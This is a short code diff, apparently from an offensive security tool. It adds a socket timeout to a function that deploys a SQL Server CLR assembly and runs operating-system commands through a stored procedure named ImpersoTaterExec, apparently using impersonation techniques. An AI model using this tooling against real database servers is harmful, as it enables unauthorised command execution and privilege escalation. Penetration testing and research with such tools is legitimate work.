@@ -126,6 +126,7 @@ def deploy_clr(sql, dll_path, cmd, technique):
 
     print(f'[*] Executing: {cmd}')
     print(f'[*] Technique: {technique}')
+    sql.socket.settimeout(120)
     escaped = cmd.replace(chr(39), chr(39)+chr(39))
     result = sql_exec_raw(sql, f"EXEC dbo.ImpersoTaterExec @cmd = N'{escaped}', @technique = N'{technique}';")
 
